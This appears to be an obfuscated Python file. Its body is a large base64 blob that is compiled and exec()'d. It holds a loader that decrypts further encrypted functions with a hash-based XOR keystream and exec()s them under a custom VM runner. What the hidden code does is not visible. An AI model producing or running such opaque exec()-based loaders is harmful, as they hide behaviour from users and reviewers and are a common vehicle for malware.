V3ZRSmZyKzhvS3M2andsMlNBRG1KVDBPampvWHgrQzZMdHRRZE52SE9MSVdCSUI0TGNEWXhrbGFhV3hPOE9PR25mRkIvT05OblFkN0VJYUE0T1JlOWFkbnJldUlXTUFlNGxqUDBiMUZqQlorOTYzQk9KUW9lYkJ6RGJnOC8wRzlBNGJnR1RCUlpQdjFHd3haZDVOMStoZzRvM2tCZWZQSGpUS2hlbldXU2RWWkNXVjJTK2NWY0dDWWdFM00wd1MvODdFTW95NlRjbndQZ2M0ZzJWZzdQa2dFa0hsTjhjL3ViVmxZVncweXZFN2Y5UjhVb2swUW5STkM5WGVZaVJrMjNIT2xyYXdjZ3FGOUJ6bXdmN1NlRnFUeE9pSUNncWEra1JEczBWVFRYejhWUFVvaE1NOGcvbUE4UThzalhBVlIwTzRVZkkyMnVoRENpSkdmM3RrQWR1TDdOVVozdzVzWXkyV1VrRjlydnlab0p2VXNtYysyR0xPK3BMdUtGcXZYaTVLSE1nRlhOUjU1a1locUVCSG84cjJyelE2cjBaQjB5R05iaU0yZGtNUnFYQkhLR0U4aXhGVXowMWNxMW1CWVlUYUZvQlNKcnRMeTRQdUd3M0xnSEpMdklDYTFVMGFGUzhJZ1VUOGo4QS9qd0JmUGttcWNUcTZOUnRTV2duY2dSNVkyRzBEaGR4RFFkdVNKcDI1dG96Wk9xek5qMU5JRTVhN2REMllIc0JKc0EzL1hMLzFmQVViWmdmVjVjSCtBczVjeUdid1o5VktIQUxveGVHSUtubWcvQU9jZ21jYmlyVXBYYUoyajg5N0lpbDVsZXJQWFZqQ2JmUXpMcXN6VWhwYUpXdkx0RVV0YTh4SXZmVzVoNmVIOHRhaTROR09EekRKZlZ2MTdsOE1LWklEWXRCMjlQVi9mSTRyZjZLRHd0dVNMZTlsTmsvcjM0Qk4rNmYzZk9hNzN6LzFGemloY05Wb2ZZTkVBS3pDSGpFTHVUSTlmZFFtM0FRbkcxaktCb3AwdW1Wc3ZuZUxuNDZoY0t3ZFVhNnV3SW1aWEk1bzVEWnRxNGFpMnRhVVhIOVdFdzJJb29Fckc1dElVSTdhV3RmRHM4QTdUT1lmMmlRZnR5Q2hHTTI0Ri9sUFFqVStpMk1xTzdxMWJ3SmI4TTB2SnpxeW9BQkZJWVdlZjlWeXAxYjdFTXdZSGRSNGY4bzV0M3p0a2l5UFN3d05FUGVXQytpSVZDMm5FclptQWhHVmlBb0hPMXRZOXZMWHBPODRmY0lNV0xkWjFocWM4c0lYbEo1ZkdqcExQR3FSTktHL1JJT0pONS9vMmZkZWx4SkpHUjZvcTl5SVhWYjUxam4yVmZFcjVjV2pzRVFmWVZTRWRsOTZ2Qjk1S1VoSjFEclBhL2IrU09zUU9GQm0xS3NaUEVRM0owWVFFMmFXakNJSXp5RVJ1ZG9XcWk3L0FRN3kwNXFtSGVHUjRxeDBhVGJFMVRnVklza3duZGNwcVpJb3VwSEkvcExieWx2L21nL2RvTGthY3JVaUp2UDVrbXhnTWc0UlpQM3owTTFibUFMcG9lUis2a2NVR3E1N2JUY1drRDh1R1dSTFZWM0d0YUErWlZHL2x3SzV4VWdBbUt0MS9sQVJIQTZUN0FpM3gvRWZ6MUpQaHJLVy9tZHlkTjJJQUtQckg5QTRQZ0U3SkM5eVZydFF5RFpDTEY2WmQxL0JKY3dRdGdOKzlQbDkwQTFjUWdyRFpZSk5iU1ZaRy9HTWc3bzhLT2R6STVnTnFkb09kdkVDMjlxVngxRzRSbTNjRVRuYVhZWW4rZXdYRTRFWkZ2S2hOSVJoa01rL0lZcUxIc2g3d0oxbktQRHZ0SEovUWgwYWdycWhJSE9jRDFSTlIyUzMzcUZNNHVFb0hpVXc0OUFBeWdkTk9acFlQU2xLUmJ0UW52cTZVeXdkVHdxOGxiZno5dkRReTRHaWNVUVZoemt4eWd3eHo0Qzk5T0FGTzBid2dNa1lOMlZYWDNlSC9YZDEwT2hFdjZSRFBBZlliTnI4dENTYUxJNTVxYTBPUVZoNGlWVzFOWkFPR0Y4SmV5dXdSbVRiZFlpYXpYYkw0QlBPbUpRMWk5N0ZVbzVBQngzckRpTmRMVldRaERkNmxNaGMwbThBckRPMnJLbWQxTkF5UWpTVVNYTjlEdXFWK2Rxb1BBTzNjMGlLdzlNNmxGc3lkcWpxWjdNbG1ZODAvbkhWSFNBMXU3bW1US0J2alkxanUyL0tiZkorN3krRVhxdk9qS3d4OHZEUnd5NFdkWlpFbmZIc2svcWJCZkFIM1RSVmowdXBYSFJPWThhUnUzdXkrVWJtWEUzZDEvYkJna3l1elFaaGtCSnYwN0w3UUhJUHNnUlZjcTRaQ1Z0OEpVWHBjOXk5bHhCci9NTUVKdi9hQnJvZmt0VWFWTFlpckR4RTUyMzJKV2huZnhscU9oQjFvUE1UVzVWTXAwRkhaNGFJM3ZJRXQ5eTV1N1FGWGlBQmM5VkJ0T3NsZU9VWXZTMTZLdGR6eVZaYXlXVTBKemt1Y0FqRjB0RkxhUVEyQ0Z6M1dUclFONDMxMjUvS0RMeHozemY2QjVvM3RycjRobkF3KzMvc2xJaG1XTWdMeGhHZUQrWllkaHg4TnpwVzFwc2JYRzFoOFgvcTMwY0tHNGFScnVnNHF6SXpSZDkza1VWejJQOVhZNU9MSjBNeklOSnVSV3k0SGw3ZG9LMDZuY0Y5SE5jb0YwR2xMcExrVlprVEREOGZBWlZlNHEwQTdYYkw0M0hZSlA2aWthdTZ2eGtGRUVaRjNINWt5TkJlNFVTZmtWQWxpZTVTNjAveWRLeC9FcU5UNGwycjczc2pRYUdqazFjM0V5dlhNSE1RdkUyYWxuUHhQRFdNYU9KYTJycXR3Tk1lWXBYV21BNlcrWXVDVEI1WGdhN2I0N2laODNNbDRORVU2bWFSRUpWaUhHNFBQTXR4dEFHZE5BVGVHdTFBUnRGUUdweERENW9QeDN0ajhnSEl3cWYzZ3hPWG54MExzaGNzYmtWODlWMVV4OUE0N1h4Mnd3MUVjZ0IzNC82R3VVUmZ4V0ZkcUNGZU5ZYWJZZEhaNjl4akFhVFlodkJZV3A1WmFCMGpzTERHNEpmdnNiUW5UbHF2b1lLQ2ZESmpXRnZMbnRHS3h3MVplM1d2b3QwYjVjb2l5djM1MEQzTkxyazlFQzU1RHFlenE1QVQya2RKTk9iZ3RhVkdiLzBJdG5aS2ZRU0tvbGFlSGNSZFB2azBRS0RTS29YWk9tNDEzS3RMdndFVlRYRm8wZzh2azJXeVY2aVZYQmlUN2lCZHNpbkNIVFBVQXhmV0dmcVNIU2NiNFdzeGRTWVp6SDZhS1ZuaHM1NTF3TDI5NXR1RjF5U2J3dXcvdGt0ZGZqREV5RFpPYWhkemhMV09vcXV2ZC9tUGxPTWdUeFRBWVNZbjZ0MDZzeW12NXVMT0Z1SFRuaDNnbHZLdDVzN2l1L1pIcU8zN1lnbmFsdGlsUU5ZMFlIdHRZbjBIUEtsTHhROXBwTWdHY3I1LytlcnUzckhHM21lKy9KVkdPdThwWTYzV21UakpFOGFkNDk1Q3oxTmlqc1dzS1RXZjZkRklpcTVEZlkxU3JvYVhFQWpPMitMYjRWRjFvNmJUR1YrWXpkQnhlVXhJbUNHY3RMSTY3VHM4bndoaU93aHVWTi94Tk9MUi9xMXhVMWxHK3J2TzRZSVdlaHlxSFM3UGRqem44SGRyVUVNc1JJRnZLbklwK1M4MHpSeHc4UWM3cUU0MnRuUWdoMXZBL2s0RDZhK1BWQ21NazU3SkRCaGR6aHZpU25PR05jZU45Z2NEUDIxS3NTM0IvUWROUkQ1dDA5K1FEby80ZUIybDNkQXVCVU14UHAxQ3lDZE12ajhNcVZySUx1N1Y4RlpLQ1hVYnNaY2pWMjNCYmpYVFVpazhJMG94T29LcFN0a1ZON2RWNWxDd1FkcWUveXBNNTNkcGNuTm1jM0tUTXlsbS9EOEJMSDFYVDgyY09yMXVWcmNQSUNQNWFxZzNpUzIrdDBPc0czd2djM29aZWk0TTNEZTdtZzJYMFI4blRzRE5YSkhXQVRKWFdLanBZUjZqQ2FXN0NGQzJvNi9zY1cwalhYY0Q1U2drNWJhVVV4MWluS2ROaUFmT0I4eHBRY1hvM09EUUYxSUx6VWdkMklDTm1GZ005bkdvK21ITHVNZWJSbzVONStpaEJLK1ZudXp3dDBGUTZxWW9nUTQrMm9jK2oweXhzYjhzT1BtcklmcjNLa2dQSnVFd0wyY1U5TGZVU3RWbmljdlg0RDZreEM1ODFTeDEwNzRsa2NZUWhndlVWb2hZeGdWTkNsdkcrT25EOXVKeHZ3VDZzbXIxdWhxZXNBVWphck5DWmhRU0J6N2lhdGhGTjl0enY3ejdDWU02WDd6YytCTC9tQUVyMVdOU1ppRjVCU3d1aUd3eDdLc3htcTdsU2hVZFNCZVJNNCtlaEJGMEIweEhOclV6ZTcrQ3VGV1UzR3RMdmtaMVRyd2MwT0kyM044QSs0cmlnUWtLRkZHNFREZCtLZGFQM2lRZjB2VW5XeGxya0IrUXQ1NStpbFkxdDN0akFvOGhoWTFINkZPQUY1aFd4ZGJMWVkvbEhpdUFqTWpzT1VIQzhoUk42ZjZ2Rm01V0tiTzd3UWdtUjFRV015ajlmbGRYY2JSamo5K1pQNk5KcGZ0YUtlTDZ5Sjc5TmVoZllvQnZBbUdLV2ZJRjA1UkZVeU5wZzNQMVErK240SkZBUWh3WHl2aTRLMFQyRUswSDd3TFpKbVRsTThScTVNTWpYTkUyWHJEazFHSkZqWFZMa2N3TnB1OE16TDhzbDlqdVZwVUZkeVRFS1k5Z2hDNzloTXkwdURnRVZEMEV0SExGR3FXdStBQmN6RkppbzUwTnRZZXVRYWdseU13eG44SWhMYXpxK09TZzhxMW05Q0l0M0FvOWhXanNxVER5ajJNRWhUTTN0TzdhRVdaQTlQajh3aGR0c1ZrREVqNmtTaEplcVMrMzArakUvTHJ6VUxmY3UvYkY0OFd1eXYxTjRnaG9NNzhVNnVmME1ZcDJTblBhbkR1cFFqQlpMNXFNZ0JhOFZmem50TmU0Ym9IVUV6QVhEMnk3dlBLSnRVT2xaN21yZGI4ekFsc0w4N1JoNllSb3hiQnhjTmN0ZmtDOWN6V21QcktaOGZ6eTN5WGo0UVBSQmVCSElyUURvdzVpK3ovM0c2bjdFaElHUEEzWStFRUdCbGFldHUzSHNKdnlLS01kcVJSaFduTXV2MFNNaTJGcnM2emJFVmJ0TkE0UW85RWtQTitaUlFJR2ZwZGR1b0NYaThyMlFhaDdvUzAwL2xPcU5oN1dHaDVVYjh2K0Ewd1ZZdnVjV3EzREY5d2dqazJMUjI0UzlqUkVWUGcrazZaSGZnOG5lc1VwNGlzSWVJVlRmNWVQV1Zpc0JyVVJmaXZxT1VnZG5NVkgydW8wUGc1LzgrOTZtbE10NTBJUWdRTGt6NmVVUW56TlNpeUZyOER3MnYrYU82a3RyeGFZVmRvaXV5SU56SDM2bVhCUXZCNVpxaUZ3cTVKRmdWL29sempqdmdITzI5dzJGVHpHRG4vcCs3VVBLWFhDMGtFUGNqcjU2LzBLcUIzVjNPdFFGUENLMzU5eHNZa095WjFrNWJMeUpQdmMwZkVXTEFOVFZxNXVRcEpVRWNRNURNMVNPV3NUNzRHbXRhcVVQUnh2NXN2V1J3Vm0xYmRRazIrc3ZENTVFRlVTNnFweTg4VGRrOEE3N0hxV0dlOUV6NnkwK0dZWndBOTVOSWY2SnFOQUJ4aE14cXA1VHZyNVo4V1VBWWZCWXZuaXpFR0FRZHVoVHg3R0hVVnppMFR0UlhYamIxZ2pBcVV5U2dTNkRYZ0VLYXkxVXp5Q1ZHcmI0TXZtbDNETnFLSGl0Yk8wczFlam5wcWdKV0NUcnZPVlhRL2lld2s0N2h2SXg5Y3VRemtsSTN3VFZrNjF0MkMvZG9STjd2QnArdlZJOHJNU1ZacmJacWlUcmdRek9DNlJhdHI4VDJybHhULzY2blNxL1NCdTk4M1ZwR3NnWnJEaCtodDljd2V4QmN0NlVucVdLNTBlSmR1N1l0dEdzWnBmMmVzSGhSVkxSVzZzUTBFZU41MkZBU3BHSTVtVHgvZ09pcFppTm4wZGt2bUVCcVZCTmd5S3JQOGtmT2N3U3g1cFlkcDdJcWFhaUpFSXM1TzlkV0pPRTF5NjlBRzhEeWpBN280OHdwRlI2Q21yTW1sMk9MUDN0ZHFXQ2dNWFRQcEprWVFaOHF2UnVvMEVlSjkwRURhYU1OTU0vVmkya0Q3SG00TzRjRVJONnozWEg1SUhBVmpFdnhIOGJYVW0rQk9sQ3I1MC9YS3Uxb0tRQklXdDFvSHBlMExQaGdkV0Jaa0ZCby9ud2gzTUFrMVRZekh5QThaMVF2ZFo2SXVDY1IvZXhFTVN5QU4ySzZITlhPSkNtYlBWaFVWa0NCTVFqeHZFR2JtQ3FSKzlUS0NVUHV6U2tMN2IwVGdRdE5uTFk0aG1MdVBnT3VCTHFoQkQ1ck1RMllaVzZvTmx0eTRvQzhkeEdPemZuZTRHMUpWLzJhMXFnUklDSVVIOWtrZHZ2WHJ6OXJTcGtGNTdDY2ZUUTNMUkhiU2NjaGRUeWk4azNCMjNDY0h5TE5sb21kSC9QOUd6b1lRYllFM3F4WFR4RHZhWDk5YlRIbVdYK2FSSE8xTjJtTUZQR2pYeUt0ZzFCT0RvRWp2KzFkanFzOWRLMFZscUZ1Nzcrc3NVNEQzZHRQZ1VISkRBdkxPVUhwWkNyeG1uZ2tOUnJUd1FiSnBxckoza1FRME9RTkJJNm41cW5CQy9VM3htTHRiNzMxczR0QUttdk5jWmlGclhqOVdmMTJ4ZUtMR1lEem1Yb2d1TkN1K0VtU2tySm1TRlNKWU52YUJOR1JmaG1aYmd5ZW5ZZjBZMUpGbmY4WXE5ZDlyZDhaRW9aR05HZHdJaUExWnhNQWRYeFZQNTAvRlRZOTV2R3BXcDJPdFI0cTdBdWJIWUJsS2ZWYkY1aTVXcWtkOEtTalJWUmt4ei9HQTBZcWw0Zm5tYVlqOHB4NHQ4K3dyeU1UMzhObHJPOUFNS005QXNpOUhUaUF3dWJybG1Pamp5NUF0V0Q0V3BvdzVaV3pHMDhvZjQyRDNlcmZIa0phRUg5Vk9vbHROaHVVbzNxNjZhTExXVWxPTU5aS3B4dm82UllWREc3bkZpbTFDb3V1aHAyMlFWMmJ3amtWL1RiOExtaW1QSVNDaFdSN3JGZStNU1lNZ2lwRy9uWU5EVGZKRUxWK09ZdFJWVlZEKzFiNGpNdVFhbEc3MVBNbnBQV1hGZ3dUbkJ4bTNIWmtaTXNxNnQrQ0FtZWQ5dEgrSngyUXkxYWRydlZqSmdPcmIybCtFYkFoY3k4VTJWcG4vZU9LZlVpMU5FMXhJb0hoeWVWd3hhMkc4dGZpOGJMV0k5bUlRUHVCRWxwRlk0bnY1c29ZNS93TTYwVXpISGhyOWZtL3JsZ3Q5RUVNaVIwZXNxbC9xK1VTKzA4ZlE5ak5ZSjkxV0lGa0VUYUNDM2xJd21EMmhBSDdTaGZXVTNGam8rNkNPMkFYY0R0MDlJMTZ0QmJ1MzJHaGxQK1cyVjRmRmtzMFUxdit2WUlsdGpDekFpSDVwbEwvUzFya0R6N0tLZ3k1Q3lDWld0WWZJNE5QSlF0dUVoMGRjQU1TRU1ZS2pSY0N1RmdTaUp5NW9qUk9WR2hSeHhGSC82ejIxNHZTamVUYytIWGh1Vm5NbksrUjBiOFpxdVgwOFlZckxlYWdscVJvSWgzZDR3TG16K1FGaWM4b3c3SUREdkVVVFVYcmZvcGw4SUtoc29KS2M4Q3ZsSjVydXpUWSs5U014OUlMMk9xb3NMTzdWSUVVclB4eFh2N1Y0b0Jwd0N1UmQ5azZyZWZhSnZ3UFk0SmlySnF5YmZ1Q1VrOGdzY0I3c0tlcGtEUDNJbGtzcGFmYWFKelVyVW1OODM2SkdJZmlhaUVWMFJPWFZJcE1CVVFKQng2OHdUd09nNWxub241dG9kMnFxdGNaZmhOOE5oY1JCdlQwTlBqZEVUclhQWmxSMHZqV3Z2SzM0bExvODhEY3ZCSUdJemtBMUVCWXpQbEhrWUpkRHlva256Y28yaENsVDRVM0NUbGJKdWlJSjJyRDRlM0RmbmdYdFR1bmU0ZEVXQTIvL0N3RCt5K1BRRFd2S0JUeHQ3YWw2T2E2QWl6dHVpUVpIYTZHeE5PV2dORStkdTZvclZFUDdINlhDM2xTVlBOOUd0K0VLN3ZFZEVURlJXRXgxcVNSMHRtMlFnNEdHWkxXMGhOeUd2bW9lMGUzZHJmY3B2MFp6bEo3Mjc2c0JEZVNFZ29mTVd5ZWVORmk1UW1xRDc0OVpQNXh1Z2taSDA0SzVjNU14djRtTEhYN1p0YzdUVUtuSnZ2ZGUyVFN6MGRla0o3WXdoNUZJMnh0Vkh2NEJFR3lmRFU3c2FseFBhRkdzK2kyUGNWU29Db1BNNEVrVGJMcUVYTGZDWHBIVTFnUlNYUFp3Um1RaWp0TTBlbUxOWUVOL21oRERPQk9hVWtYZkdqUkorQmJpaW0rYmJXTUxHYWVaOHoxWXhOa09TV0RJcG9OeHpTb1ZabzNHcWk4NWQ0QVN5TmdQWnptR3d3bWlMZjlIMWwxNXRRZ0NPTzhMdkpYdFNrRklieEdjYWpzRjhSU0UvYlF0QWFYd1haWlF1VVZmQ1MwbkEvRkZ1SUNyckhUTS9rb3ZPYXA1OHJuWXZyQzV1M0FzaHBuZzN5SVZVZTBzUlJtWml2MlA1cnUrWG9CVGhtK0tPOVRkUS90dzM0SHpJZXNFb2RDUk92R085MDBQOWFCbUVlSm5McnQ2SUdiQ3FOZHhrRkJUR1dnZldycHNCbEhVWGZkTzdBaVhFV1NHZ2VZTHliU0xwOVJ5dHViYUZrRUdrL0tiblRNSG1kaTNtQVV3L2RERzFzSFhWYWJWRXllZklMZTB6UUc3WlM1a2dpQVNtS1pMNHMwZ0h0OE50LzdKN0ZUbjlYUGJGc0FFNkFJUFFjUzM0RTF5Wlg0Rkd5K2FTZ2JNUERDSVViMFF4L0NkTjIydG1kdmpXNnRxY3plcjFlRlJTUk9FMGRLM2hBZm1GbzNIaDIyc2VsYmZBb2xReUVHM2hlRjNwMjdrcmg0UWlrUEk0L1Rjc1dFenJRUDhEc2dUdkRramlSYVBaazVXZDE5a0J3dEs3aGhJRUw3SmZtUmdta3dGdU1PTkRRSmhGREZvOVlxc2JkT0VXTVhaNXVhZEdacVFhUkdJYW9HSlVMSHR0N2M2RjZOYW91NndhMkkwNjRGNm0wcDYwSCtLKzZMamVzOGx6RVkweXVkOGhqcHFWaGlVbnJ5dlA4ZnFCcEhiT2pXZWZIZjJHNlIvS2l3TXNTV09PdzVqTHdQQ0V0ck4zb3BpWjZCalJGNC9ET2xDWS83UDZIQlU3cE9Wd09Sc2FPVnhkRG0rK1BiQ1lnRHNxV1hUSUhGckNJbkZGTW9iU3hOS3Y5OGRBL2V4ZEJXU3FmbE9WV24wR2tiM3RRYzJzUi9GN2o2ckZ1VzZBT05vcWZQSWxQaDh1S20xSkJ1OTFwdzRWNFNlN0JGTjRncHZmUUdiZ0VyaTNJZVA2S0E3RHcwTUhJWGJUUG5hbkc2eHJYeVBzc0dYSndUMHpoWU5DTGZaOWExRHVzUXloY09rNGdXSlo3amw0VEVhN1lFY2tHVGpLOXV4TG9Na3ZRZjZ2QlA4elQ3RnEzY3FyMS9NamZldGpQZnUxZGhibEhkSGk5YXJSWFU5Rm9YMDlvSHJmak11Q1NLcUlONTFGTnFrSFFYaTZ2UHFKS05NN2ZVcE5LbDlzeE5UN3hBNUpGR2VmTytZcUlnSkxMRDMzb3V3ekFxSWJ6bm1mREJhR3k2Z3k1bkJIdElaYS9yN3VzaGFhSXdmYm1kNGNPR2hRY1BCbXk3UGJmMzcxUy9oajd6bWpKWVdaWmdMTHEyTkFaNWZ3Mkd1aHVVV0RrUmw1TUJxbmZzYlIvNVBiZUNNR1hFc1hOWHQ1WlBBcmNMQ2hRRlErMW5lUjNTak9JMXd6QlN3UmhBaGV5OXdXOUxwczB1d1BUdy9hUzdscHhKUXFSaXJ1THJTUFF3bVdQUUJaNklkWVBjdWc4T0R5aHB6ejBNZkZTeFZZUzErdXV2VzF1NVlxazBBZkk3Vm5Mb0VFZEk0YkwwZFo3VWo3THFtVzlmWnNRN2NOcUVuS205dGJ0M3diUzhhTC83YnhwL0dnL2ZEaDZYSjZWa0NScVBzeWw0alBrSGtNTzhROGlFZHNjUHFSb0JwTzdqdnZHWjJZVzMvL2gzNXJyUXZYQUNod0lDcTlLYWQyQmNPcW1yK0FCU1RXMVpIdzhaYk1BbEZoN2Z4RXJqdU9JOThGdHR4YTEvSSsvUmZLRXY3TXBOc0Rla3JvVTd2aU5kQkRrbUtFczhkSjhUVHlwZXpVaXc2bVdMVEkwSDlOMk5STjZQbjQ3cnVvYTYyTFN3NVU5NjIvUHZLdVc0QmNMUjZKSEZhWUsxWlBwcUppNHoxZzR6dmpENytCUTZyZGhUZ3YwdVhwcHhRYS80TnVWaTUyekJ3S0hub0tGTk55ZmJFYTZMc0VaaG41LzRKVjFocElMQzMvUmdlbEtVeGZPNSs2N09hc01NcHQ0TGlSSGFwS0NYb3pjRHdOZXh3K2h4TS9vT2VBQm1WU1A3MG1PM0dYNUFQeTdiWGM5Tzd4K3F5ME9UeVdWSnlRNlRjVm40ZnN3YVkvRWRibDlxdURDZEt5dXgzOD0nKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuYXBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncykKCmRlZiBfZigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZygqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygzLCBfRlVOQ19LRVksICdfZycsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _wraqx()
